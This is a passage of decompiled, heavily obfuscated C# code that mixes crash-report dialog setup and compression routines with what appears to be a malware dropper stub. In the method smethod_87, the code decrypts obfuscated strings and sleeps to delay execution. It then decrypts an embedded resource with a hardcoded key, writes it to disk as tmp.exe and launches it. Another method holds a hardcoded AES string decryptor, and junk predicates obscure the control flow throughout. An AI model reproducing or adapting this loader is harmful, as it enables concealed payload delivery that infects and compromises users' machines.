				form0_0.label_0.set_FlatStyle((FlatStyle)3);
				((Control)form0_0.label_0).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
				((Control)form0_0.label_0).set_Location(new Point(20, 124));
				((Control)form0_0.label_0).set_Name("pleaseTellTitle");
				((Control)form0_0.label_0).set_Size(new Size(381, 16));
				((Control)form0_0.label_0).set_TabIndex(11);
				goto IL_047f;
				IL_047f:
				((Control)form0_0.label_0).set_Text("Please tell %CompanyName% about this problem.");
				((Control)form0_0.button_0).set_Anchor((AnchorStyles)10);
				((ButtonBase)form0_0.button_0).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_0).set_Location(new Point(325, 205));
				goto IL_04c2;
				IL_04c2:
				((Control)form0_0.button_0).set_Name("dontSendReport");
				goto IL_04d2;
				IL_04d2:
				((Control)form0_0.button_0).set_Size(new Size(75, 24));
				goto IL_04e6;
				IL_04e6:
				((Control)form0_0.button_0).set_TabIndex(6);
				((Control)form0_0.button_0).set_Text("&Don't Send");
				((Control)form0_0.button_0).add_Click((EventHandler)form0_0.method_1);
				goto IL_0519;
				IL_0519:
				((Control)form0_0.button_1).set_Anchor((AnchorStyles)10);
				((ButtonBase)form0_0.button_1).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_1).set_Location(new Point(214, 205));
				goto IL_054c;
				IL_054c:
				((Control)form0_0.button_1).set_Name("sendReport");
				((Control)form0_0.button_1).set_Size(new Size(105, 24));
				((Control)form0_0.button_1).set_TabIndex(9);
				((Control)form0_0.button_1).set_Text("&Send Error Report");
				((Control)form0_0.button_1).add_Click((EventHandler)form0_0.method_0);
				goto IL_05a4;
				IL_05a4:
				((Control)form0_0.label_1).set_Anchor((AnchorStyles)14);
				form0_0.label_1.set_FlatStyle((FlatStyle)3);
				goto IL_05bd;
				IL_05bd:
				((Control)form0_0.label_1).set_Location(new Point(20, 140));
				((Control)form0_0.label_1).set_Name("pleaseTellMessage");
				((Control)form0_0.label_1).set_Size(new Size(381, 55));
				goto IL_05fb;
				IL_05fb:
				((Control)form0_0.label_1).set_TabIndex(12);
				((Control)form0_0.label_1).set_Text("To help improve the software you use, %CompanyName% is interested in learning more about this error. We have created a report about the error for you to send to us.");
				((Control)form0_0.control1_0).set_BackColor(Color.FromArgb(36, 96, 179));
				goto IL_0631;
				IL_0631:
				((Control)form0_0.control1_0).set_Dock((DockStyle)1);
				((Control)form0_0.control1_0).set_ForeColor(Color.White);
				goto IL_064d;
				IL_064d:
				form0_0.control1_0.IconState = Enum5.const_1;
				goto IL_0659;
				IL_0659:
				form0_0.control1_0.Image = null;
				((Control)form0_0.control1_0).set_Location(new Point(0, 0));
				((Control)form0_0.control1_0).set_Name("headerControl1");
				goto IL_0687;
				IL_0687:
				((Control)form0_0.control1_0).set_Size(new Size(413, 58));
				((Control)form0_0.control1_0).set_TabIndex(3);
				((Control)form0_0.control1_0).set_TabStop(false);
				goto IL_06b6;
				IL_06b6:
				((Control)form0_0.control1_0).set_Text("%AppName% has encountered a problem.\nWe are sorry for the inconvenience.");
				((Control)form0_0.class53_0).set_Anchor((AnchorStyles)13);
				((Label)form0_0.class53_0).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.class53_0).set_Location(new Point(20, 69));
				((Control)form0_0.class53_0).set_Name("errorMessage");
				((Control)form0_0.class53_0).set_Size(new Size(381, 13));
				goto IL_071a;
				IL_071a:
				((Control)form0_0.class53_0).set_TabIndex(10);
				num = 35;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					goto IL_0737;
				}
				goto IL_1201;
				IL_0737:
				form0_0.checkBox_1 = new CheckBox();
				form0_0.textBox_0 = new TextBox();
				form0_0.control1_2 = new Control1();
				form0_0.label_2 = new Label();
				form0_0.button_6 = new Button();
				form0_0.control2_0 = new Control2();
				form0_0.button_8 = new Button();
				goto IL_0784;
				IL_0784:
				((Control)form0_0.panel_0).SuspendLayout();
				((Control)form0_0.panel_1).SuspendLayout();
				((Control)form0_0.panel_2).SuspendLayout();
				((Control)form0_0).SuspendLayout();
				((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_5);
				((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.checkBox_0);
				((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_0);
				((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_0);
				((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_1);
				((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_1);
				((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.control1_0);
				((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.class53_0);
				((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_7);
				goto IL_0871;
				IL_0871:
				((Control)form0_0.panel_0).set_Location(new Point(8, 8));
				goto IL_0883;
				IL_0883:
				((Control)form0_0.panel_0).set_Name("panelInformation");
				goto IL_0893;
				continue;
				end_IL_1327:
				break;
			}
		}
	}

	static void smethod_79(int int_0, byte[] byte_0, Class31.Class33 class33_0, int int_1)
	{
		if (class33_0.int_0 < class33_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_1 + int_0;
		if (0 <= int_1 && int_1 <= num && num <= byte_0.Length)
		{
			if (((uint)int_0 & (true ? 1u : 0u)) != 0)
			{
				class33_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class33_0.int_2);
				class33_0.int_2 += 8;
			}
			class33_0.byte_0 = byte_0;
			class33_0.int_0 = int_1;
			class33_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static object smethod_80(object object_0, string string_0)
	{
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class30.SubkeyApplication);
		if (registryKey == null)
		{
			return object_0;
		}
		return registryKey.GetValue(string_0, object_0);
	}

	static bool smethod_81(Class31.Class40 class40_0)
	{
		return class40_0.int_8 == class40_0.int_7;
	}

	static bool smethod_82(int int_0, Class31.Class40 class40_0)
	{
		int num = 128;
		int num2 = 128;
		short[] short_ = class40_0.short_1;
		int int_ = class40_0.int_4;
		int num3 = class40_0.int_4 + class40_0.int_2;
		int num4 = Math.Max(class40_0.int_2, 2);
		int num5 = Math.Max(class40_0.int_4 - 32506, 0);
		int num6 = class40_0.int_4 + 258 - 1;
		byte b = class40_0.byte_0[num3 - 1];
		byte b2 = class40_0.byte_0[num3];
		if (num4 >= 8)
		{
			num >>= 2;
		}
		if (num2 > class40_0.int_5)
		{
			num2 = class40_0.int_5;
		}
		do
		{
			if (class40_0.byte_0[int_0 + num4] != b2 || class40_0.byte_0[int_0 + num4 - 1] != b || class40_0.byte_0[int_0] != class40_0.byte_0[int_] || class40_0.byte_0[int_0 + 1] != class40_0.byte_0[int_ + 1])
			{
				continue;
			}
			int num7 = int_0 + 2;
			int_ += 2;
			while (class40_0.byte_0[++int_] == class40_0.byte_0[++num7] && class40_0.byte_0[++int_] == class40_0.byte_0[++num7] && class40_0.byte_0[++int_] == class40_0.byte_0[++num7] && class40_0.byte_0[++int_] == class40_0.byte_0[++num7] && class40_0.byte_0[++int_] == class40_0.byte_0[++num7] && class40_0.byte_0[++int_] == class40_0.byte_0[++num7] && class40_0.byte_0[++int_] == class40_0.byte_0[++num7] && class40_0.byte_0[++int_] == class40_0.byte_0[++num7] && int_ < num6)
			{
			}
			if (int_ > num3)
			{
				class40_0.int_1 = int_0;
				num3 = int_;
				num4 = int_ - class40_0.int_4;
				if (num4 >= num2)
				{
					break;
				}
				b = class40_0.byte_0[num3 - 1];
				b2 = class40_0.byte_0[num3];
			}
			int_ = class40_0.int_4;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > num5 && --num != 0);
		class40_0.int_2 = Math.Min(num4, class40_0.int_5);
		return class40_0.int_2 >= 3;
	}

	static void smethod_83(Class31.Class41 class41_0, int int_0, int int_1)
	{
		class41_0.uint_0 |= (uint)(int_0 << class41_0.int_2);
		class41_0.int_2 += int_1;
		if (class41_0.int_2 >= 16)
		{
			class41_0.byte_0[class41_0.int_1++] = (byte)class41_0.uint_0;
			class41_0.byte_0[class41_0.int_1++] = (byte)(class41_0.uint_0 >> 8);
			class41_0.uint_0 >>= 16;
			class41_0.int_2 -= 16;
		}
	}

	static string smethod_84(string string_0)
	{
		if (string_0.StartsWith("\"<RSAKeyValue>") && string_0.EndsWith("</RSAKeyValue>\""))
		{
			return "*** Information not reported for security reasons ***";
		}
		return string_0;
	}

	static bool smethod_85(Class31.Class32 class32_0)
	{
		int num = Class58.smethod_143(class32_0.class34_0);
		while (num >= 258)
		{
			switch (class32_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class58.smethod_111(class32_0.class35_0, class32_0.class33_0)) & -256) == 0)
				{
					Class58.smethod_44(class32_0.class34_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class32_0.int_6 = Class31.Class32.int_0[num2 - 257];
					class32_0.int_5 = Class31.Class32.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class32_0.class35_1 = null;
				class32_0.class35_0 = null;
				class32_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class32_0.int_5 > 0)
				{
					class32_0.int_4 = 8;
					int num4 = Class58.smethod_10(class32_0.class33_0, class32_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class58.smethod_28(class32_0.class33_0, class32_0.int_5);
					class32_0.int_6 += num4;
				}
				class32_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class58.smethod_111(class32_0.class35_1, class32_0.class33_0);
				if (num2 >= 0)
				{
					class32_0.int_7 = Class31.Class32.int_2[num2];
					class32_0.int_5 = Class31.Class32.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class32_0.int_5 > 0)
				{
					class32_0.int_4 = 10;
					int num3 = Class58.smethod_10(class32_0.class33_0, class32_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class58.smethod_28(class32_0.class33_0, class32_0.int_5);
					class32_0.int_7 += num3;
				}
				Class58.smethod_0(class32_0.class34_0, class32_0.int_6, class32_0.int_7);
				num -= class32_0.int_6;
				class32_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static void smethod_86()
	{
		string text = "";
	}

	static void smethod_87(Class5.Class10 class10_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		byte[] array = default(byte[]);
		string text = default(string);
		string text2 = default(string);
		object executablePath = default(object);
		string text3 = default(string);
		bool flag = default(bool);
		ResourceManager resourceManager = default(ResourceManager);
		string text4 = default(string);
		string text5 = default(string);
		byte[] array2 = default(byte[]);
		string sourceFileName = default(string);
		byte[] byte_ = default(byte[]);
		ProcessStartInfo startInfo = default(ProcessStartInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				byte[] array3;
				string text6;
				bool flag2;
				string empty;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 903:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0057;
						case 6:
							goto IL_005d;
						case 7:
							goto IL_00c0;
						case 8:
						case 9:
							goto IL_00c6;
						case 10:
						case 11:
							goto IL_00ca;
						case 12:
							goto IL_00d8;
						case 13:
							goto IL_00ed;
						case 14:
							goto IL_010c;
						case 15:
						case 16:
							goto IL_0120;
						case 17:
							goto IL_013a;
						case 18:
							goto IL_0140;
						case 19:
							goto IL_0151;
						case 21:
							goto IL_0159;
						case 22:
							goto IL_015d;
						case 24:
							goto IL_0176;
						case 20:
						case 23:
						case 25:
						case 26:
						case 27:
							goto IL_017a;
						case 28:
							goto IL_0185;
						case 29:
							goto IL_01b3;
						case 30:
							goto IL_01b9;
						case 31:
							goto IL_01c3;
						case 32:
							goto IL_01dc;
						case 33:
							goto IL_01f3;
						case 34:
							goto IL_020a;
						case 35:
							goto IL_0213;
						case 36:
							goto IL_0235;
						case 37:
							goto IL_024c;
						case 38:
							goto IL_0258;
						case 39:
							goto IL_026a;
						case 40:
							goto IL_0278;
						case 41:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 42:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0278:
					num = 40;
					Class58.smethod_22(new object[5]
					{
						string.Empty,
						array,
						false,
						false,
						text
					});
					break;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002b;
					IL_002b:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_0034;
					IL_0034:
					num = 4;
					text3 = Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_0057;
					IL_0057:
					num = 5;
					flag = false;
					goto IL_005d;
					IL_005d:
					num = 6;
					if (Operators.ConditionalCompareObjectEqual((object)(text3 + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + ""), Operators.ConcatenateObject(Operators.ConcatenateObject(executablePath, (object)""), (object)""), false))
					{
						goto IL_00c0;
					}
					goto IL_00c6;
					IL_00c0:
					num = 7;
					flag = true;
					goto IL_00c6;
					IL_00c6:
					num = 9;
					goto IL_00ca;
					IL_00ca:
					num = 11;
					Thread.Sleep(32000);
					goto IL_00d8;
					IL_00d8:
					num = 12;
					resourceManager = new ResourceManager("叫零美会见八", Assembly.GetExecutingAssembly());
					goto IL_00ed;
					IL_00ed:
					num = 13;
					text4 = "" + Interaction.Environ("TEMP") + "";
					goto IL_010c;
					IL_010c:
					num = 14;
					Class58.smethod_18(Class58.smethod_109("oAJ9Pm/REVvo5UjKLLNqMA=="));
					goto IL_0120;
					IL_0120:
					num = 16;
					text5 = Class58.smethod_109("9p12f/nXPDi4YbupHn4TFQ==") + ".exe";
					goto IL_013a;
					IL_013a:
					num = 17;
					array2 = array2;
					goto IL_0140;
					IL_0140:
					num = 18;
					array3 = Class58.smethod_147("fsfsdfsdfsdfsdf", array2);
					goto IL_0151;
					IL_0151:
					num = 19;
					if (!flag)
					{
						goto IL_0159;
					}
					goto IL_017a;
					IL_0159:
					num = 21;
					goto IL_015d;
					IL_015d:
					num = 22;
					if (!Operators.ConditionalCompareObjectEqual(executablePath, (object)(text3 + "#nsdffdsp#$$$.exe$$$"), false))
					{
						goto IL_0176;
					}
					goto IL_017a;
					IL_0176:
					num = 24;
					goto IL_017a;
					IL_017a:
					num = 27;
					text6 = "";
					goto IL_0185;
					IL_0185:
					num = 28;
					sourceFileName = Interaction.Environ(Class58.smethod_109("rRhnphBugUiRcVlpVgLfjw==")) + Class58.smethod_109("ijulUbn8DPPkee8Mdv0Pf3JPXTMNWvYRORO+JfoPSAU=") + Class58.smethod_109("RmHHgWXRYcJTbievhyZVDA==");
					goto IL_01b3;
					IL_01b3:
					num = 29;
					flag2 = false;
					goto IL_01b9;
					IL_01b9:
					num = 30;
					empty = string.Empty;
					goto IL_01c3;
					IL_01c3:
					num = 31;
					text = "" + text4 + "\\" + text5;
					goto IL_01dc;
					IL_01dc:
					num = 32;
					byte_ = (byte[])resourceManager.GetObject("妈国那美七认");
					goto IL_01f3;
					IL_01f3:
					num = 33;
					array = Class58.smethod_147(Class58.smethod_109("axfXKc1uSPw22HSCJhAWEa6DjhDSpCiOMzx2Wd3rCNIeUVvr7X0cLx7c6+sI2SXe"), byte_);
					goto IL_020a;
					IL_020a:
					num = 34;
					Class58.smethod_123();
					goto IL_0213;
					IL_0213:
					num = 35;
					((ServerComputer)Class2.Computer).get_FileSystem().WriteAllBytes(text2 + "tmp.exe", array, false);
					goto IL_0235;
					IL_0235:
					num = 36;
					startInfo = new ProcessStartInfo(text2 + "tmp.exe");
					goto IL_024c;
					IL_024c:
					num = 37;
					Process.Start(startInfo);
					goto IL_0258;
					IL_0258:
					num = 38;
					File.Delete(text3 + text5);
					goto IL_026a;
					IL_026a:
					num = 39;
					File.Copy(sourceFileName, text, overwrite: true);
					goto IL_0278;
					end_IL_0000_2:
					break;
				}
				num = 41;
				Thread.Sleep(10000);
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 903;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_88(Class31.Class38 class38_0)
	{
		int num = 0;
		int num2 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		while (true)
		{
			if (num < class38_0.int_1)
			{
				num2 = class38_0.byte_1[num] & 0xFF;
			}
			else
			{
				if (IwxRFxvB9dB3g1fRikX())
				{
					goto IL_0070;
				}
				switch (7)
				{
				case 2:
					break;
				case 0:
				case 1:
					goto IL_0045;
				case 6:
					goto IL_004a;
				default:
					goto IL_0070;
				case 4:
				case 5:
					goto IL_008a;
				case 7:
					Class58.smethod_17(class38_0.class39_0, 256);
					return;
				}
			}
			int num3 = class38_0.short_0[num];
			if (num3-- != 0)
			{
				int num4 = Class58.smethod_14(class38_0, num2);
				Class58.smethod_17(class38_0.class39_0, num4);
				num5 = (num4 - 261) / 4;
				goto IL_0045;
			}
			Class58.smethod_17(class38_0.class39_0, num2);
			goto IL_00b0;
			IL_00b0:
			num++;
			continue;
			IL_0070:
			Class58.smethod_17(class38_0.class39_1, num6);
			num5 = num6 / 2 - 1;
			if (num5 <= 0)
			{
				goto IL_00b0;
			}
			goto IL_008a;
			IL_0067:
			num6 = Class58.smethod_166(class38_0, num3);
			goto IL_0070;
			IL_004a:
			if (num5 <= 5)
			{
				Class58.smethod_83(class38_0.class41_0, num2 & ((1 << num5) - 1), num5);
			}
			goto IL_0067;
			IL_008a:
			Class58.smethod_83(class38_0.class41_0, num3 & ((1 << num5) - 1), num5);
			goto IL_00b0;
			IL_0045:
			if (num5 > 0)
			{
				goto IL_004a;
			}
			goto IL_0067;
		}
	}

	static bool smethod_89(Class44.Class48 class48_0, byte[] byte_0, Class44 class44_0)
	{
		byte[] byte_;
		try
		{
			byte_ = Class58.smethod_56(byte_0);
		}
		catch (Exception)
		{
			Class58.smethod_159(class44_0, Enum4.const_0, Class31.string_0);
			return false;
		}
		byte[] array = Class58.smethod_156(byte_, "<RSAKeyValue><Modulus>lXAo73/15RcoubOjnZaBc/9y4v9tehHA7qz4Ab3/vH43Kr2dy+hQ9zOEqpmefPmTh0Z+hj4AYJVZLJ5rlo74JB9SJJDN3B3t+p6SWnJtylAEpeaNQXzbaUuJnWtC8C2sf38RnSlOOzwgF/3U2oZHrNsZUPKouGIovSSnrG7bSak=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		if (array == null)
		{
			Class58.smethod_159(class44_0, Enum4.const_0, Class43.string_0);
			return false;
		}
		Class58.smethod_45(class44_0, Enum4.const_1);
		Class56 @class = new Class56("d98c1dd4-008f-04b2-e980-0998ecf8427e");
		if (class44_0.iwebProxy_0 != null)
		{
			@class.iwebProxy_0 = class44_0.iwebProxy_0;
		}
		Class44.Class46 class2 = new Class44.Class46(class44_0, array, @class, class48_0);
		Class58.smethod_69((Delegate21)class2.method_0, @class);
		return class2.bool_0;
	}

	static void smethod_90(object object_0, string string_0, Class45 class45_0)
	{
		class45_0.dictionary_0.Add(string_0, object_0);
	}

	static void smethod_91(Class31.Stream0 stream0_0, int int_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static void smethod_92(byte[] byte_0, Class31.Class35 class35_0)
	{
		int[] array = new int[16];
		int[] array2 = new int[16];
		foreach (int num in byte_0)
		{
			if (num > 0)
			{
				array[num]++;
			}
		}
		int num2 = 0;
		int num3 = 512;
		for (int j = 1; j <= 15; j++)
		{
			array2[j] = num2;
			num2 += array[j] << 16 - j;
			if (j >= 10)
			{
				int num4 = array2[j] & 0x1FF80;
				int num5 = num2 & 0x1FF80;
				num3 += num5 - num4 >> 16 - j;
			}
		}
		class35_0.short_0 = new short[num3];
		int num6 = 512;
		for (int num7 = 15; num7 >= 10; num7--)
		{
			int num8 = num2 & 0x1FF80;
			num2 -= array[num7] << 16 - num7;
			int num9 = num2 & 0x1FF80;
			for (int k = num9; k < num8; k += 128)
			{
				class35_0.short_0[Class58.smethod_33(k)] = (short)((-num6 << 4) | num7);
				num6 += 1 << num7 - 9;
			}
		}
		for (int l = 0; l < byte_0.Length; l++)
		{
			int num10 = byte_0[l];
			if (num10 == 0)
			{
				continue;
			}
			num2 = array2[num10];
			int num11 = Class58.smethod_33(num2);
			if (num10 <= 9)
			{
				do
				{
					class35_0.short_0[num11] = (short)((l << 4) | num10);
					num11 += 1 << num10;
				}
				while (num11 < 512);
			}
			else
			{
				int num12 = class35_0.short_0[num11 & 0x1FF];
				int num13 = 1 << (num12 & 0xF);
				num12 = -(num12 >> 4);
				do
				{
					class35_0.short_0[num12 | (num11 >> 9)] = (short)((l << 4) | num10);
					num11 += 1 << num10;
				}
				while (num11 < num13);
			}
			array2[num10] = num2 + (1 << 16 - num10);
		}
	}

	static void smethod_93(Class31.Class38.Class39 class39_0)
	{
		int num = class39_0.short_0.Length;
		int num5 = default(int);
		int[] array2 = default(int[]);
		int[] array3 = default(int[]);
		int num9 = default(int);
		int num10 = default(int);
		int num12 = default(int);
		int num14 = default(int);
		int num13 = default(int);
		int num11 = default(int);
		int num15 = default(int);
		int num16 = default(int);
		int num17 = default(int);
		int num20 = default(int);
		while (true)
		{
			int[] array = new int[num];
			int num2 = 0;
			int num3 = 0;
			int num4 = 0;
			while (true)
			{
				int num6;
				if (num4 < num)
				{
					num5 = class39_0.short_0[num4];
					if (num5 == 0)
					{
						goto IL_02b3;
					}
					num6 = num2++;
					goto IL_02a8;
				}
				while (num2 < 2)
				{
					int num7 = ((num3 < 2) ? (++num3) : 0);
					array[num2++] = num7;
				}
				class39_0.int_1 = Math.Max(num3 + 1, class39_0.int_0);
				int num8 = num2;
				array2 = new int[4 * num2 - 2];
				array3 = new int[2 * num2 - 1];
				num9 = num8;
				num10 = 0;
				goto IL_0069;
				IL_00d7:
				if (num11 < num2)
				{
					if (num11 + 1 < num2 && array3[array[num11]] > array3[array[num11 + 1]])
					{
						num11++;
					}
					array[num12] = array[num11];
					num12 = num11;
					goto IL_00cf;
				}
				num14 = array3[num13];
				goto IL_0101;
				IL_0101:
				while ((num11 = num12) > 0 && array3[array[num12 = (num11 - 1) / 2]] > num14)
				{
					array[num11] = array[num12];
				}
				array[num11] = num13;
				goto IL_0110;
				IL_02b3:
				num4++;
				continue;
				IL_00cf:
				num11 = num11 * 2 + 1;
				goto IL_00d7;
				IL_02a8:
				if (num6 <= 0 || class39_0.short_0[array[num15 = (num6 - 1) / 2]] <= num5)
				{
					array[num6] = num4;
					goto IL_0266;
				}
				array[num6] = array[num15];
				goto IL_027c;
				IL_0115:
				num13 = num9++;
				array2[2 * num13] = num16;
				array2[2 * num13 + 1] = num17;
				goto IL_0130;
				IL_0130:
				int num18 = Math.Min(array3[num16] & 0xFF, array3[num17] & 0xFF);
				num14 = (array3[num13] = array3[num16] + array3[num17] - num18 + 1);
				num12 = 0;
				num11 = 1;
				goto IL_0162;
				IL_0110:
				num17 = array[0];
				goto IL_0115;
				IL_0266:
				num3 = num4;
				int num19 = 2;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					goto IL_0080;
				}
				goto IL_020f;
				IL_020f:
				while (true)
				{
					switch (num19)
					{
					case 18:
						array2[2 * num10] = num20;
						goto case 3;
					case 3:
						array2[2 * num10 + 1] = -1;
						array3[num10] = class39_0.short_0[num20] << 8;
						array[num10] = num10;
						num10++;
						goto IL_0069;
					case 1:
						break;
					case 11:
						goto IL_0080;
					case 8:
					case 13:
						goto IL_00cf;
					case 10:
						goto IL_00d7;
					case 15:
						goto IL_0101;
					case 7:
						goto IL_0110;
					case 12:
						goto IL_0115;
					case 16:
						goto IL_0130;
					case 5:
					case 14:
						goto IL_01b7;
					case 6:
						while ((num11 = num12) > 0 && array3[array[num12 = (num11 - 1) / 2]] > num14)
						{
							array[num11] = array[num12];
						}
						goto case 4;
					case 4:
						array[num11] = num13;
						if (num2 > 1)
						{
							goto IL_006f;
						}
						goto case 19;
					default:
						num19 = 10;
						if (v2IJBhvCyRSyXwG8iyi())
						{
							continue;
						}
						goto case 18;
					case 17:
						goto IL_0266;
					case 9:
						goto IL_027c;
					case 2:
						goto IL_02b3;
					case 0:
						goto end_IL_031b;
					case 19:
						Class58.smethod_119(array2, class39_0);
						return;
					}
					break;
				}
				goto IL_0074;
				IL_027c:
				num6 = num15;
				goto IL_02a8;
				IL_01b7:
				num12 = num11;
				num11 = num12 * 2 + 1;
				goto IL_0162;
				IL_0069:
				if (num10 >= num2)
				{
					goto IL_006f;
				}
				num20 = array[num10];
				num19 = 18;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					goto IL_00d7;
				}
				goto IL_020f;
				IL_006f:
				num16 = array[0];
				goto IL_0074;
				IL_0074:
				num13 = array[--num2];
				goto IL_0080;
				IL_0080:
				num12 = 0;
				num11 = 1;
				goto IL_00d7;
				IL_0162:
				if (num11 >= num2)
				{
					num19 = 6;
					if (IwxRFxvB9dB3g1fRikX())
					{
					}
				}
				else
				{
					if (num11 + 1 < num2 && array3[array[num11]] > array3[array[num11 + 1]])
					{
						num11++;
					}
					array[num12] = array[num11];
					num19 = 5;
					if (!v2IJBhvCyRSyXwG8iyi())
					{
						goto IL_02b3;
					}
				}
				goto IL_020f;
				continue;
				end_IL_031b:
				break;
			}
		}
	}

	static string smethod_94(string string_0)
	{
		string password = "nia";
		string s = "cffffffffffffffffff";
		byte[] bytes = default(byte[]);
		byte[] bytes2 = default(byte[]);
		byte[] array = default(byte[]);
		byte[] bytes3 = default(byte[]);
		ICryptoTransform transform = default(ICryptoTransform);
		string result = default(string);
		MemoryStream memoryStream = default(MemoryStream);
		while (true)
		{
			string text = "SHA1";
			int iterations = 2;
			string s2 = "@1B2c3D4e5F6g7H8";
			int num = 256;
			if (!IwxRFxvB9dB3g1fRikX())
			{
				switch (7)
				{
				case 2:
					break;
				case 1:
				case 7:
					bytes = Encoding.ASCII.GetBytes(s2);
					bytes2 = Encoding.ASCII.GetBytes(s);
					array = Convert.FromBase64String(string_0);
					goto case 5;
				case 5:
				{
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes2, iterations);
					bytes3 = rfc2898DeriveBytes.GetBytes(num / 8);
					goto default;
				}
				default:
				{
					RijndaelManaged rijndaelManaged = new RijndaelManaged();
					rijndaelManaged.Mode = CipherMode.CBC;
					transform = rijndaelManaged.CreateDecryptor(bytes3, bytes);
					goto IL_00b2;
				}
				case 4:
					goto IL_00b2;
				case 6:
					goto end_IL_000c;
				case 8:
					return result;
				}
				continue;
			}
			goto IL_00b2;
			IL_00b2:
			memoryStream = new MemoryStream(array);
			break;
			continue;
			end_IL_000c:
			break;
		}
		CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
		byte[] array2 = new byte[checked(array.Length - 1 + 1)];
		int count = cryptoStream.Read(array2, 0, array2.Length);
		memoryStream.Close();
		cryptoStream.Close();
		return Encoding.UTF8.GetString(array2, 0, count);
	}

	static void smethod_95(Exception exception_0, object object_0)
	{
		Class58.smethod_19(exception_0, new object[1] { object_0 });
	}

	static bool smethod_96(bool bool_0, Class31.Class40 class40_0, bool bool_1)
	{
		bool flag;
		do
		{
			Class58.smethod_1(class40_0);
			bool bool_2 = bool_1 && class40_0.int_7 == class40_0.int_8;
			flag = Class58.smethod_30(bool_0, bool_2, class40_0);
		}
		while (class40_0.class41_0.IsFlushed && flag);
		return flag;
	}

	static void smethod_97(Class45 class45_0, Exception exception_0)
	{
		using (new Class59(class45_0.xmlWriter_0, "Exception"))
		{
			try
			{
				Type type = exception_0.GetType();
				class45_0.method_3(type);
				string value = "N/A";
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class45_0.xmlWriter_0.WriteAttributeString("Message", value);
				string text = exception_0.StackTrace!.Trim();
				class45_0.xmlWriter_0.WriteAttributeString("ExceptionStackTrace", text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf("\r\n");
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class45_0.xmlWriter_0.WriteAttributeString("Method", text);
				class45_0.method_1(new Class49(exception_0, firstLevel: true));
			}
			catch
			{
			}
		}
	}

	static int smethod_98(Class31.Class34 class34_0)
	{
		return class34_0.int_1;
	}

	static void smethod_99(string string_0, EventArgs1 eventArgs1_0, string string_1)
	{
		Class58.smethod_128(string_0, eventArgs1_0.class45_0, string_1);
	}

	static byte[] smethod_100(EventArgs1 eventArgs1_0)
	{
		return Class58.smethod_129(eventArgs1_0.class45_0);
	}

	static int smethod_101(Class31.Class38.Class39 class39_0)
	{
		int num = 0;
